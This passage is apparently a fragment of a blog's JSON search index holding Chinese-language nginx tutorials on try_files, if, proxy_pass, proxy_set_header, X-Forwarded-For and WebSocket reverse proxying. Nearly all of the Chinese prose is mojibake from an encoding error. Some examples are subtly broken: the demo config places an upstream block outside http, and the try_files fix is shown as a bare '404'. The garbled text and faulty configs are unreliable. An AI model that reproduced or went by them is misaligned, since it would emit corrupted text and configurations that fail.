(=404)ä½œä¸ºæœ€åä¸€ä¸ªå‚æ•°ï¼Œå¦‚æœæ˜¯æœ€åä¸€ä¸ªå‚æ•°æ˜¯æ–‡ä»¶ï¼Œé‚£ä¹ˆè¿™ä¸ªæ–‡ä»¶å¿…é¡»å­˜åœ¨ã€‚\n\n\n\næˆ‘ä»¬æ¥çœ‹ä¸€ä¸ªé”™è¯¯:\n\n```nginx\nlocation ~.*\\.(gif|jpg|jpeg|png)$ {\n        root /web/wwwroot;\n        try_files /static/$uri $uri;\n}\n```\n\nåŸæ„å›¾æ˜¯è®¿é—®`http://example.com/test.jpg`æ—¶å…ˆå»æ£€æŸ¥`/web/wwwroot/static/test.jpg`æ˜¯å¦å­˜åœ¨ï¼Œä¸å­˜åœ¨å°±å–`/web/wwwroot/test.jpg`\n\nä½†ç”±äºæœ€åä¸€ä¸ªå‚æ•°æ˜¯ä¸€ä¸ªå†…éƒ¨é‡å®šå‘ï¼Œæ‰€ä»¥å¹¶ä¸ä¼šæ£€æŸ¥`/web/wwwroot/test.jpg`æ˜¯å¦å­˜åœ¨ï¼Œåªè¦ç¬¬ä¸€ä¸ªè·¯å¾„ä¸å­˜åœ¨å°±ä¼šé‡æ–°å‘ç„¶åå†è¿›å…¥è¿™ä¸ªlocationé€ æˆæ­»å¾ªç¯ã€‚ç»“æœå‡ºç°500 Internal Server Error\n\n```nginx\nlocation ~.*\\.(gif|jpg|jpeg|png)$ {\n        root /web/wwwroot;\n        try_files /static/$uri $uri 404;\n}\n```\n\nè¿™æ ·æ‰ä¼šå…ˆæ£€æŸ¥`/web/wwwroot/static/test.jpg`æ˜¯å¦å­˜åœ¨ï¼Œä¸å­˜åœ¨å°±å–`/web/wwwroot/test.jpg`å†ä¸å­˜åœ¨åˆ™è¿”å›404 not found\n\n\n\n##### 2.4 ifæŒ‡ä»¤\n\nifä¸æ˜¯ç³»ç»Ÿçº§çš„æŒ‡ä»¤, æ˜¯å’Œrewriteé…åˆçš„. if å¿…é¡»å†™åœ¨serverå’Œlocationé‡Œé¢.\n\n- å˜é‡å:   å¦‚æœæ˜¯ç©ºå­—ç¬¦ä¸²æˆ–\"0\"ä¸ºFALSE\n- = åˆ¤æ–­ç›¸ç­‰, != åˆ¤æ–­ä¸ç›¸ç­‰\n- ~ å’Œ ~*(ä¸åˆ†åŒºå¤§å°å†™) å°†å˜é‡ä¸æ­£åˆ™åŒ¹é…, æ•è·å¯ä»¥ç”¨ $1 åˆ° $9\n- !~ å’Œ !~* ç”¨ä½œä¸åŒ¹é…è¿ç®—ç¬¦\n- æ­£åˆ™å«æœ‰ } æˆ– ; å­—ç¬¦éœ€è¦ç”¨å¼•å·æ‹¬èµ·æ¥\n- å¸¸ç”¨åˆ¤æ–­æŒ‡ä»¤\n  - -f å’Œ !-f åˆ¤æ–­æ˜¯å¦å­˜åœ¨æ–‡ä»¶(file)\n  - -d å’Œ !-d åˆ¤æ–­æ˜¯å¦å­˜åœ¨ç›®å½•(directory)\n  - -e å’Œ !-e åˆ¤æ–­æ˜¯å¦å­˜åœ¨æ–‡ä»¶æˆ–ç›®å½•(exists)\n  - -x å’Œ !-x åˆ¤æ–­æ–‡ä»¶æ˜¯å¦å¯æ‰§è¡Œ(execute)\n\n\n\nä¾‹å¦‚ä¸‹é¢çš„åˆ—å­:\n\n```nginx\nif ($http_user_agent ~ Chrome) {\n    rewrite ^([^/]*)$ /chrome$1 break;\n}\n\nif ($request_method = POST){\n    return 405;\n}\n\nif (-f $request_filename) {\n    expires max;\n    break;\n}\n```\n\n\n\n### 3. proxy_passæ¨¡å—\n\nproxy_passæŒ‡ä»¤æ˜¯å°†è¯·æ±‚åå‘ä»£ç†åˆ°URLå‚æ•°æŒ‡å®šçš„æœåŠ¡å™¨ä¸Šï¼ŒURLå¯ä»¥æ˜¯ä¸»æœºåæˆ–è€…IPåœ°å€+ç«¯å£å·çš„å½¢å¼ï¼Œä¾‹å¦‚ï¼š\n\n```\nproxy_pass http://proxy_server;\nproxy_pass http://192.168.9.2:8000;\nproxy_pass https://192.168.9.2:8000;\n```\n\nproxy_passæ¨¡å—åŸºæœ¬é…ç½®ï¼š \n+ proxy_set_headerï¼šè®¾ç½®æœåŠ¡å™¨è·å–ç”¨æˆ·çš„ä¸»æœºåæˆ–è€…çœŸå®ipåœ°å€ï¼Œä»¥åŠä»£ç†è€…çš„çœŸå®ipåœ°å€ã€‚ \n+ client_body_buffer_sizeï¼šç”¨äºæŒ‡å®šå®¢æˆ·ç«¯è¯·æ±‚ä¸»ä½“ç¼“å†²åŒºå¤§å°ï¼Œå¯ä»¥ç†è§£ä¸ºå…ˆä¿å­˜åˆ°æœ¬åœ°å†ä¼ ç»™ç”¨æˆ· \n+ proxy_connect_timeoutï¼šè¡¨ç¤ºè¿æ¥æœåŠ¡å™¨çš„è¶…æ—¶æ—¶é—´ï¼Œå³å‘èµ·tcpæ¡æ‰‹ç­‰å€™å“åº”çš„è¶…æ—¶æ—¶é—´ \n+ proxy_send_timeï¼šæœåŠ¡å™¨çš„æ•°æ®ä¼ å›æ—¶é—´ï¼Œåœ¨è§„å®šæ—¶é—´å†…æœåŠ¡å™¨å¿…é¡»ä¼ å›å®Œæ‰€æœ‰æ•°æ®ï¼Œå¦åˆ™ï¼Œnginxå°†æ–­å¼€è¿™ä¸ªè¿æ¥ \n+ proxy_read_timeï¼šè®¾ç½®nginxä»ä»£ç†çš„åç«¯æœåŠ¡å™¨è·å–æ•°æ®çš„æ—¶é—´ï¼Œè¡¨ç¤ºè¿æ¥å»ºç«‹æˆåŠŸåï¼Œ+ nginxç­‰å¾…æœåŠ¡å™¨çš„å“åº”æ—¶é—´ï¼Œå…¶å®æ˜¯nginxå·²ç»è¿›å…¥æœåŠ¡å™¨çš„æ’é˜Ÿä¸­ç­‰å€™å¤„ç†çš„æ—¶é—´ã€‚ \n+ proxy_buffer_sizeï¼šè®¾ç½®ç¼“å†²åŒºå¤§å°ï¼Œé»˜è®¤è¯¥ç¼“å†²åŒºå¤§å°ç­‰äºproxy_buffersè®¾ç½®çš„å¤§å° \n+ proxy_buffersï¼šè®¾ç½®ç¼“å†²åŒºçš„æ•°é‡å’Œå¤§å°ï¼Œnginxä»ä»£ç†çš„æœåŠ¡å™¨è·å–å“åº”æ•°æ®ä¼šæ”¾ç½®åˆ°ç¼“å†²åŒº \n+ proxy_busy_buffers_sizeï¼šç”¨äºè®¾ç½®ç³»ç»Ÿå¾ˆå¿™æ—¶å¯ä»¥ä½¿ç”¨çš„proxy_bufferså¤§å°ï¼Œå®˜æ–¹æ¨èå¤§å°ä¸ºproxy_buffers*2 \n+ proxy_temp_file_write_sizeï¼šæŒ‡å®šproxyç¼“å­˜ä¸´æ—¶æ–‡ä»¶çš„å¤§å°\n\n\n\n##### 3.1 proxy_set_header\n\n```bash\nè¯­æ³•:    proxy_set_header field value;\né»˜è®¤å€¼:    \nproxy_set_header Host $proxy_host; # æ³¨æ„è¿™ä¸ªæ˜¯proxy_host\nproxy_set_header Connection close;\n\n\nä¸Šä¸‹æ–‡:    http, server, location\n```\n\nå…è®¸é‡æ–°å®šä¹‰æˆ–è€…æ·»åŠ å‘å¾€åç«¯æœåŠ¡å™¨çš„è¯·æ±‚å¤´ã€‚valueå¯ä»¥åŒ…å«æ–‡æœ¬ã€å˜é‡æˆ–è€…å®ƒä»¬çš„ç»„åˆã€‚ å½“ä¸”ä»…å½“å½“å‰é…ç½®çº§åˆ«ä¸­æ²¡æœ‰å®šä¹‰proxy_set_headeræŒ‡ä»¤æ—¶ï¼Œä¼šä»ä¸Šé¢çš„çº§åˆ«ç»§æ‰¿é…ç½®ã€‚é»˜è®¤æƒ…å†µä¸‹ï¼Œåªæœ‰ä¸¤ä¸ªè¯·æ±‚å¤´ä¼šè¢«é‡æ–°å®šä¹‰ï¼š\n\n```nginx\nproxy_set_header Host       $proxy_host;\nproxy_set_header Connection close;\n```\n\n\n\nproxy_set_headerä¹Ÿå¯ä»¥è‡ªå®šä¹‰å‚æ•°ï¼Œå¦‚ï¼šproxy_set_header test paroxy_test;\n\nå¦‚æœæƒ³è¦æ”¯æŒä¸‹åˆ’çº¿çš„è¯ï¼Œéœ€è¦å¢åŠ å¦‚ä¸‹é…ç½®ï¼š`underscores_in_headers on`; \n\n```bash\nè¯­æ³•ï¼šunderscores_in_headers on|off\né»˜è®¤å€¼ï¼šoff\nä½¿ç”¨å­—æ®µï¼šhttp, server\næ˜¯å¦å…è®¸åœ¨headerçš„å­—æ®µä¸­å¸¦ä¸‹åˆ’çº¿\n```\n\n\n\n##### 3.2 é‡åˆ°çš„é—®é¢˜\n\n> ç»è¿‡åå‘ä»£ç†åï¼Œç”±äºåœ¨å®¢æˆ·ç«¯å’ŒwebæœåŠ¡å™¨ä¹‹é—´å¢åŠ äº†ä¸­é—´å±‚ï¼Œå› æ­¤webæœåŠ¡å™¨æ— æ³•ç›´æ¥æ‹¿åˆ°å®¢æˆ·ç«¯çš„ip, é€šè¿‡$remote_addrå˜é‡æ‹¿åˆ°çš„å°†æ˜¯åå‘ä»£ç†æœåŠ¡å™¨çš„ipåœ°å€. å¦‚æœæˆ‘ä»¬æƒ³è¦åœ¨webç«¯è·å¾—ç”¨æˆ·çš„çœŸå®ipï¼Œå°±å¿…é¡»åœ¨nginxè¿™é‡Œä½œä¸€ä¸ªèµ‹å€¼æ“ä½œï¼Œå¦‚ä¸‹ï¼š\n\n```nginx\nproxy_set_header            X-real-ip $remote_addr;\n```\n\nå…¶ä¸­è¿™ä¸ªX-real-ipæ˜¯ä¸€ä¸ªè‡ªå®šä¹‰çš„å˜é‡åï¼Œåå­—å¯ä»¥éšæ„å–ï¼Œè¿™æ ·åšå®Œä¹‹åï¼Œç”¨æˆ·çš„çœŸå®ipå°±è¢«æ”¾åœ¨X-real-ipè¿™ä¸ªå˜é‡é‡Œäº†ï¼Œç„¶åï¼Œåœ¨webç«¯å¯ä»¥è¿™æ ·è·å–ï¼šrequest.getAttribute(\"X-real-ip\")\n\n\n\n>  é€šå¸¸æˆ‘ä»¬ä¼šçœ‹åˆ°æœ‰è¿™æ ·ä¸€äº›é…ç½®:\n\n```\nserver {\n        server_name liuwei.fhyx.com;\n\n        proxy_set_header       X-Real-IP $remote_addr;\n        proxy_set_header       X-Forwarded-For $proxy_add_x_forwarded_for;\n        proxy_set_header       Host $http_host;\n        proxy_redirect         off;\n        proxy_http_version     1.1;\n        proxy_set_header       Upgrade $http_upgrade;\n        proxy_set_header       Connection \"upgrade\";\n        proxy_buffering        off;\n\n        location / {\n                proxy_pass     http://127.0.0.1:8000;\n        }\n\n        location ~ \"/(box|c|bub)/\" {\n                proxy_pass     http://127.0.0.1:8081;\n        }\n\n        location ~ /(a|o2)/ {\n                proxy_pass     http://127.0.0.1:3010;\n        }\n\n        location ~ \"/api/(v\\d{1,2})/\" {\n                proxy_pass     http://127.0.0.1:5010;\n        }\n\n}\n```\n\n##### proxy_set_header   X-real-ip $remote_addr;\n\nè¿™å¥è¯ä¹‹å‰å·²ç»è§£é‡Šè¿‡ï¼Œæœ‰äº†è¿™å¥å°±å¯ä»¥åœ¨webæœåŠ¡å™¨ç«¯è·å¾—ç”¨æˆ·çš„çœŸå®ip, ä½†æ˜¯ï¼Œå®é™…ä¸Šè¦è·å¾—ç”¨æˆ·çš„çœŸå®ipï¼Œä¸æ˜¯åªæœ‰è¿™ä¸€ä¸ªæ–¹æ³•ã€‚\n\n##### proxy_set_header   X-Forwarded-For $proxy_add_x_forwarded_for;\n\nX-Forwarded-For æ˜¯ä¸€ä¸ª HTTP æ‰©å±•å¤´éƒ¨ã€‚HTTP/1.1ï¼ˆRFC 2616ï¼‰åè®®å¹¶æ²¡æœ‰å¯¹å®ƒçš„å®šä¹‰ï¼Œå®ƒæœ€å¼€å§‹æ˜¯ç”± Squid è¿™ä¸ªç¼“å­˜ä»£ç†è½¯ä»¶å¼•å…¥ï¼Œç”¨æ¥è¡¨ç¤º HTTP è¯·æ±‚ç«¯çœŸå® IPã€‚å¦‚ä»Šå®ƒå·²ç»æˆä¸ºäº‹å®ä¸Šçš„æ ‡å‡†ï¼Œè¢«å„å¤§ HTTP ä»£ç†ã€è´Ÿè½½å‡è¡¡ç­‰è½¬å‘æœåŠ¡å¹¿æ³›ä½¿ç”¨ï¼Œå¹¶è¢«å†™å…¥ [RFC 7239](http://tools.ietf.org/html/rfc7239)ï¼ˆForwarded HTTP Extensionï¼‰æ ‡å‡†ä¹‹ä¸­ã€‚\n\nX-Forwarded-For è¯·æ±‚å¤´æ ¼å¼éå¸¸ç®€å•ï¼Œå°±è¿™æ ·ï¼š\n\n```bash\nX-Forwarded-For: client, proxy1, proxy2\n```\n\nå¯ä»¥çœ‹åˆ°ï¼ŒXFF çš„å†…å®¹ç”±ã€Œè‹±æ–‡é€—å· + ç©ºæ ¼ã€éš”å¼€çš„å¤šä¸ªéƒ¨åˆ†ç»„æˆï¼Œæœ€å¼€å§‹çš„æ˜¯ç¦»æœåŠ¡ç«¯æœ€è¿œçš„è®¾å¤‡ IPï¼Œç„¶åæ˜¯æ¯ä¸€çº§ä»£ç†è®¾å¤‡çš„ IPã€‚\n\n å¦‚æœä¸€ä¸ª HTTP è¯·æ±‚åˆ°è¾¾æœåŠ¡å™¨ä¹‹å‰ï¼Œç»è¿‡äº†ä¸‰ä¸ªä»£ç† Proxy1ã€Proxy2ã€Proxy3ï¼ŒIP åˆ†åˆ«ä¸º IP1ã€IP2ã€IP3ï¼Œç”¨æˆ·çœŸå® IP ä¸º IP0ï¼Œé‚£ä¹ˆæŒ‰ç…§ XFF æ ‡å‡†ï¼ŒæœåŠ¡ç«¯æœ€ç»ˆä¼šæ”¶åˆ°ä»¥ä¸‹ä¿¡æ¯ï¼š\n\n  ```bash\nX-Forwarded-For: IP0, IP1, IP2\n  ```\n\nProxy3 ç›´è¿æœåŠ¡å™¨ï¼Œå®ƒä¼šç»™ XFF è¿½åŠ  IP2ï¼Œè¡¨ç¤ºå®ƒæ˜¯åœ¨å¸® Proxy2 è½¬å‘è¯·æ±‚ã€‚åˆ—è¡¨ä¸­å¹¶æ²¡æœ‰ IP3ï¼ŒIP3 å¯ä»¥åœ¨æœåŠ¡ç«¯é€šè¿‡ Remote Address å­—æ®µè·å¾—ã€‚æˆ‘ä»¬çŸ¥é“ HTTP è¿æ¥åŸºäº TCP è¿æ¥ï¼ŒHTTP åè®®ä¸­æ²¡æœ‰ IP çš„æ¦‚å¿µï¼ŒRemote Address æ¥è‡ª TCP è¿æ¥ï¼Œè¡¨ç¤ºä¸æœåŠ¡ç«¯å»ºç«‹ TCP è¿æ¥çš„è®¾å¤‡ IPï¼Œåœ¨è¿™ä¸ªä¾‹å­é‡Œå°±æ˜¯ IP3ã€‚\n\nRemote Address æ— æ³•ä¼ªé€ ï¼Œå› ä¸ºå»ºç«‹ TCP è¿æ¥éœ€è¦ä¸‰æ¬¡æ¡æ‰‹ï¼Œå¦‚æœä¼ªé€ äº†æº IPï¼Œæ— æ³•å»ºç«‹ TCP è¿æ¥ï¼Œæ›´ä¸ä¼šæœ‰åé¢çš„ HTTP è¯·æ±‚ã€‚ä¸åŒè¯­è¨€è·å– Remote Address çš„æ–¹å¼ä¸ä¸€æ ·ï¼Œä¾‹å¦‚ php æ˜¯ `$_SERVER[\"REMOTE_ADDR\"]`ï¼ŒNode.js æ˜¯ `req.connection.remoteAddress`ï¼Œä½†åŸç†éƒ½ä¸€æ ·ã€‚\n\nå¯¹äº Web åº”ç”¨æ¥è¯´ï¼Œ`X-Forwarded-For` å’Œ `X-Real-IP` å°±æ˜¯ä¸¤ä¸ªæ™®é€šçš„è¯·æ±‚å¤´ï¼Œè‡ªç„¶å°±ä¸åšä»»ä½•å¤„ç†åŸæ ·è¾“å‡ºäº†ã€‚è¿™è¯´æ˜ï¼Œå¯¹äºç›´è¿éƒ¨ç½²æ–¹å¼ï¼Œé™¤äº†ä» TCP è¿æ¥ä¸­å¾—åˆ°çš„ Remote Address ä¹‹å¤–ï¼Œè¯·æ±‚å¤´ä¸­æºå¸¦çš„ IP ä¿¡æ¯éƒ½ä¸èƒ½ä¿¡ã€‚  \n\n##### proxy_set_header       Host $http_host;\n\n- $hostï¼šè¯·æ±‚ä¸­çš„ä¸»æœºå¤´(HOST)å­—æ®µï¼Œå¦‚æœè¯·æ±‚ä¸­çš„ä¸»æœºå¤´ä¸å¯ç”¨æˆ–è€…ç©ºï¼Œåˆ™ä¸ºå¤„ç†è¯·æ±‚çš„serveråç§°(å¤„ç†è¯·æ±‚çš„serverçš„server_nameæŒ‡ä»¤çš„å€¼)ã€‚å€¼ä¸ºå°å†™ï¼Œä¸åŒ…å«ç«¯å£!!!!\n\n- å¦‚æœå®¢æˆ·ç«¯å‘è¿‡æ¥çš„è¯·æ±‚çš„headerä¸­æœ‰â€™HOSTâ€™è¿™ä¸ªå­—æ®µæ—¶ï¼Œ`$http_host`å’Œ`$host`éƒ½æ˜¯åŸå§‹çš„â€™HOSTâ€™å­—æ®µæ¯”å¦‚è¯·æ±‚çš„æ—¶å€™HOSTçš„å€¼æ˜¯www.csdn.net é‚£ä¹ˆåä»£åè¿˜æ˜¯www.csdn.net\n  \n  å¦‚æœå®¢æˆ·ç«¯å‘è¿‡æ¥çš„è¯·æ±‚çš„headerä¸­æ²¡æœ‰æœ‰â€™HOSTâ€™è¿™ä¸ªå­—æ®µæ—¶ï¼Œ å»ºè®®ä½¿ç”¨$hostï¼Œè¿™è¡¨ç¤ºè¯·æ±‚ä¸­çš„server nameã€‚\n  \n\n\n\n### 4. websocketåå‘ä»£ç†\n\n+ nginx é¦–å…ˆç¡®è®¤ç‰ˆæœ¬å¿…é¡»æ˜¯1.3ä»¥ä¸Šã€‚\n\n+ mapæŒ‡ä»¤çš„ä½œç”¨ï¼š è¯¥ä½œç”¨ä¸»è¦æ˜¯æ ¹æ®å®¢æˆ·ç«¯è¯·æ±‚ä¸­$http_upgradeçš„å€¼ï¼Œæ¥æ„é€ æ”¹å˜$connection_upgradeçš„å€¼ï¼Œå³æ ¹æ®å˜é‡$http_upgradeçš„å€¼åˆ›å»ºæ–°çš„å˜é‡$connection_upgradeï¼Œ åˆ›å»ºçš„è§„åˆ™å°±æ˜¯{}é‡Œé¢çš„ä¸œè¥¿ã€‚å…¶ä¸­çš„è§„åˆ™æ²¡æœ‰åšåŒ¹é…ï¼Œå› æ­¤ä½¿ç”¨é»˜è®¤çš„ï¼Œå³ $connection_upgradeçš„å€¼ä¼šä¸€ç›´æ˜¯ upgradeã€‚ç„¶åå¦‚æœ $http_upgradeä¸ºç©ºå­—ç¬¦ä¸²çš„è¯ï¼Œ é‚£å€¼ä¼šæ˜¯ closeã€‚\n\n```nginx\n#å¿…é¡»æ·»åŠ çš„\nmap $http_upgrade $connection_upgrade {\n        default upgrade;\n        '' close;\n}\n\nupstream websocket {\n    ip_hash;\n    #è½¬å‘åˆ°æœåŠ¡å™¨ä¸Šç›¸åº”çš„wsç«¯å£\n    server localhost:3344;\n    server localhost:8011;\n}\nserver {\n    listen 80;\n    server_name a.liuvv.com;\n    location / {\n    \n        #è½¬å‘åˆ°http://websocket\n        proxy_pass http://websocket;\n        proxy_read_timeout 300s;\n        proxy_send_timeout 300s;\n\n        proxy_set_header Host $host;\n        proxy_set_header X-Real-IP $remote_addr;\n        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;\n    \n        #å‡çº§http1.1åˆ° websocketåè®®  \n        proxy_http_version 1.1;\n        proxy_set_header Upgrade $http_upgrade;\n        proxy_set_header Connection  $connection_upgrade;\n    }\n}\n```\n\n\n\n\n\n### 5. å‚è€ƒèµ„æ–™:\n\n+ https://nginx.org/en/docs/\n+ [Nginxé…ç½®locationã€ifä»¥åŠreturnã€rewriteå’Œ try_files æŒ‡ä»¤](https://www.xiebruce.top/710.html)\n+ [Nginx åŸºæœ¬åŠŸèƒ½ - å°† Nginx é…ç½®ä¸º Web æœåŠ¡å™¨](https://blog.csdn.net/kikajack/article/details/79322194)\n+ [Nginx çš„ try_files æŒ‡ä»¤ä½¿ç”¨å®ä¾‹](https://www.hi-linux.com/posts/53878.html)\n+ [HTTP è¯·æ±‚å¤´ä¸­çš„ X-Forwarded-For](https://imququ.com/post/x-forwarded-for-header-in-http.html)","tags":["nginx"],"categories":["nginx"]},{"title":"nginxä»‹ç»å’Œå¸¸ç”¨æ¨¡å—é…ç½®","url":"%2Fp%2F7245bfc7.html","content":"\nNginxåŠŸèƒ½ä¸°å¯Œï¼Œå¯ä½œä¸ºHTTPæœåŠ¡å™¨ï¼Œä¹Ÿå¯ä½œä¸ºåå‘ä»£ç†æœåŠ¡å™¨ï¼Œé‚®ä»¶æœåŠ¡å™¨ã€‚æ”¯æŒFastCGIã€SSLã€Virtual Hostã€URL Rewriteã€Gzipç­‰åŠŸèƒ½ã€‚å¹¶ä¸”æ”¯æŒå¾ˆå¤šç¬¬ä¸‰æ–¹çš„æ¨¡å—æ‰©å±•ã€‚\n\n\n\n# é›¶. å‰è¨€\n\n### 0.1 é…ç½®æ–‡ä»¶åœ¨å“ª\n\nå®‰è£…å¥½nginxæˆ‘ä»¬é¦–å…ˆè¦çŸ¥é“é…ç½®æ–‡ä»¶åœ¨å“ªé‡Œ?\n\n![1](nginx_config/1.png)\n\n\n\nè¯´æ˜nginxçš„ä¸»é…ç½®æ–‡ä»¶éƒ½åœ¨ `/etc/nginx/nginx.conf`é‡Œ. æ‰“å¼€æ–‡ä»¶æˆ‘ä»¬è¿˜å¯ä»¥çœ‹åˆ°\n\n```ngnix\ninclude /etc/nginx/conf.d/*.conf;\ninclude /etc/nginx/sites-enabled/*;\n```\n\n\n\néœ€è¦æ·»åŠ æ–°é…ç½®é€‰é¡¹çš„åœ°æ–¹ä½äº sites-enabled æ–‡ä»¶å¤¹ã€‚å¦‚æœä½ æ‰“å¼€è¿™ä¸ªæ–‡ä»¶å¤¹ï¼Œä½ ä¼šå‘ç°ä¸€ä¸ªåä¸º default çš„æ–‡æ¡£ï¼Œæ‰“å¼€åä½ å°±ä¼šæ‰¾åˆ°nginxçš„é…ç½®é€‰é¡¹, å½“ä½ å®‰è£…å¥½nginxé»˜è®¤çœ‹åˆ°çš„é¦–é¡µå°±æ˜¯åœ¨è¿™é‡Œé…ç½®çš„.\n\n\n\nåœ¨è¯¥ç›®å½•ä¸‹è¿˜æœ‰ä¸€ä¸ª sites-available çš„æ–‡ä»¶å¤¹, è¿™ä¸ªæ–‡ä»¶å¤¹ä¸€èˆ¬åœ¨ä½ éœ€è¦å»ºç«‹å’Œç®¡ç†å¤šä¸ªç«™ç‚¹çš„æ—¶å€™éå¸¸æœ‰ç”¨ï¼Œå¯ä»¥å¸®åŠ©ä½ æ›´å¥½çš„ç»„ç»‡ä¸åŒçš„é¡¹ç›®ã€‚ä½ éœ€è¦åœ¨è¿™é‡Œæ·»åŠ ä½ çš„nginxé…ç½®æ–‡æ¡ˆå¹¶å°†ä»–ä»¬é“¾æ¥è‡³ sites-enabled ç›®å½•ä¸‹ã€‚\n\n\n\nåªæœ‰åœ¨ sites-enabled ç›®å½•ä¸‹çš„é…ç½®æ–‡ä»¶æ‰èƒ½å¤ŸçœŸæ­£è¢«ç”¨æˆ·è®¿é—®ã€‚ä½†æ˜¯ä½ åŒæ ·å¯ä»¥å°†æ–‡ä»¶æ”¾åœ¨ sites-available ç›®å½•ä¸‹ç”¨æ¥å­˜æ¡£æˆ–è€…ç”Ÿæˆé“¾æ¥ã€‚\n\n<!-- more -->\n\n\n\n### 0.2 é»˜è®¤rootåœ¨å“ª\n\n```bash\nnginx -V\nit lists --prefix as the first one.\n```\n\n\n\n### 0.3 é‡å¯nginx\n\n```bash\nsudo nginx -s reload\n```\n\nreloadï¼Œé‡æ–°åŠ è½½çš„æ„æ€ï¼Œreloadä¼šé‡æ–°åŠ è½½é…ç½®æ–‡ä»¶ï¼ŒnginxæœåŠ¡ä¸ä¼šä¸­æ–­ï¼Œè€Œä¸”reloadæ—¶ä¼šæµ‹è¯•confè¯­æ³•ç­‰ï¼Œå¦‚æœå‡ºé”™ä¼šrollbackç”¨ä¸Šä¸€æ¬¡æ­£ç¡®é…ç½®æ–‡ä»¶ä¿æŒæ­£å¸¸è¿è¡Œã€‚\n\nrestartï¼Œé‡å¯ï¼Œä¼šé‡å¯nginxæœåŠ¡ã€‚è¿™ä¸ªé‡å¯ä¼šé€ æˆæœåŠ¡ä¸€ç¬é—´çš„ä¸­æ–­ï¼Œå½“ç„¶å¦‚æœé…ç½®æ–‡ä»¶å‡ºé”™ä¼šå¯¼è‡´æœåŠ¡å¯åŠ¨å¤±è´¥ï¼Œé‚£å°±æ˜¯æ›´é•¿æ—¶é—´çš„æœåŠ¡ä¸­æ–­äº†ã€‚\n\n\n\n# ä¸€. nginx å¸¸ç”¨åŠŸèƒ½è¯´æ˜\n\n\n\n### 1.1 åå‘ä»£ç†\n\nä¸‹é¢ä¸€å¼ å›¾æ˜¯å¯¹æ­£å‘ä»£ç†ä¸åå“ä»£ç†çš„å¯¹æ¯”\n\n\n![1](nginx_config/1.jpg)\n\nNginxåœ¨åšåå‘ä»£ç†æ—¶ï¼Œæä¾›æ€§èƒ½ç¨³å®šï¼Œå¹¶ä¸”èƒ½å¤Ÿæä¾›é…ç½®çµæ´»çš„è½¬å‘åŠŸèƒ½ã€‚Nginxå¯ä»¥æ ¹æ®ä¸åŒçš„æ­£åˆ™åŒ¹é…ï¼Œé‡‡å–ä¸åŒçš„è½¬å‘ç­–ç•¥ï¼Œæ¯”å¦‚å›¾ç‰‡æ–‡ä»¶ç»“å°¾çš„èµ°æ–‡ä»¶æœåŠ¡å™¨ï¼ŒåŠ¨æ€é¡µé¢èµ°webæœåŠ¡å™¨ï¼Œåªè¦ä½ æ­£åˆ™å†™çš„æ²¡é—®é¢˜ï¼Œåˆæœ‰ç›¸å¯¹åº”çš„æœåŠ¡å™¨è§£å†³æ–¹æ¡ˆï¼Œä½ å°±å¯ä»¥éšå¿ƒæ‰€æ¬²çš„ç©ã€‚å¹¶ä¸”Nginxå¯¹è¿”å›ç»“æœè¿›è¡Œé”™è¯¯é¡µè·³è½¬ï¼Œå¼‚å¸¸åˆ¤æ–­ç­‰ã€‚å¦‚æœè¢«åˆ†å‘çš„æœåŠ¡å™¨å­˜åœ¨å¼‚å¸¸ï¼Œä»–å¯ä»¥å°†è¯·æ±‚é‡æ–°è½¬å‘ç»™å¦å¤–ä¸€å°æœåŠ¡å™¨ï¼Œç„¶åè‡ªåŠ¨å»é™¤å¼‚å¸¸æœåŠ¡å™¨ã€‚\n\n\n\n### 1.2 è´Ÿè½½å‡è¡¡\n\nNginxæä¾›çš„è´Ÿè½½å‡è¡¡ç­–ç•¥æœ‰2ç§ï¼šå†…ç½®ç­–ç•¥å’Œæ‰©å±•ç­–ç•¥ã€‚\n\nå†…ç½®ç­–ç•¥ä¸ºè½®è¯¢ï¼ŒåŠ æƒè½®è¯¢ï¼ŒIp hashã€‚æ‰©å±•ç­–ç•¥ï¼Œå°±å¤©é©¬è¡Œç©ºï¼Œåªæœ‰ä½ æƒ³ä¸åˆ°çš„æ²¡æœ‰ä»–åšä¸åˆ°çš„å•¦ï¼Œä½ å¯ä»¥å‚ç…§æ‰€æœ‰çš„è´Ÿè½½å‡è¡¡ç®—æ³•ï¼Œç»™ä»–ä¸€ä¸€æ‰¾å‡ºæ¥åšä¸‹å®ç°ã€‚\n\n\n\nçœ‹ä¸‹é¢çš„å›¾ç†è§£ä¸‰ç§è´Ÿè½½å‡è¡¡ç®—æ³•çš„å®ç°\n\n![1](nginx_config/2.jpg)\n\n\n\nIp hashç®—æ³•ï¼Œå¯¹å®¢æˆ·ç«¯è¯·æ±‚çš„ipè¿›è¡Œhashæ“ä½œï¼Œç„¶åæ ¹æ®hashç»“æœå°†åŒä¸€ä¸ªå®¢æˆ·ç«¯ipçš„è¯·æ±‚åˆ†å‘ç»™åŒä¸€å°æœåŠ¡å™¨è¿›è¡Œå¤„ç†ï¼Œå¯ä»¥è§£å†³sessionä¸å…±äº«çš„é—®é¢˜ã€‚\n\n![1](nginx_config/3.jpg)\n\n\n\n### 1.3 webç¼“å­˜\n\nnginxå¯ä»¥å¯¹ä¸åŒçš„æ–‡ä»¶åšä¸åŒçš„ç¼“å­˜å¤„ç†ï¼Œé…ç½®çµæ´»ï¼Œå¹¶ä¸”æ”¯æŒFastCGI_Cacheï¼Œä¸»è¦ç”¨äºå¯¹FastCGIçš„åŠ¨æ€ç¨‹åºè¿›è¡Œç¼“å­˜ã€‚é…åˆç€ç¬¬ä¸‰æ–¹çš„ngx_cache_purgeï¼Œå¯¹åˆ¶å®šçš„URLç¼“å­˜å†…å®¹å¯ä»¥çš„è¿›è¡Œå¢åˆ ç®¡ç†ã€‚\n\n\n\n# äºŒ. nginxé…ç½®æ–‡ä»¶ç»“æ„\n\n\n\nå…ˆæ”¾ä¸€ä¸ªé…ç½®demo\n\n```nginx\nuser  nobody;\nworker_processes  1;\npid        logs/nginx.pid;\n\nevents {\n    worker_connections  1024;\n}\n\nupstream mysvr {   \n  server 127.0.0.1:7878;\n  server 192.168.10.121:3333 backup;\n}\n\nhttp {\n    include       mime.types;\n    default_type  application/octet-stream;\n  \n    server {\n        listen       80;\n        server_name  localhost;\n        location / {\n            root   html;\n            index  index.html index.htm;\n        }\n    }\n}\n```\n\n\n\n### 2.1 é…ç½®æ–‡ä»¶ç»“æ„\n\n+ main(å…¨å±€å—)[ä¸€ä¸ª]\n+ events (nginxå·¥ä½œæ¨¡å¼)[ä¸€ä¸ª]\n\n+ http(httpè®¾ç½®)[ä¸€ä¸ª]\n  + 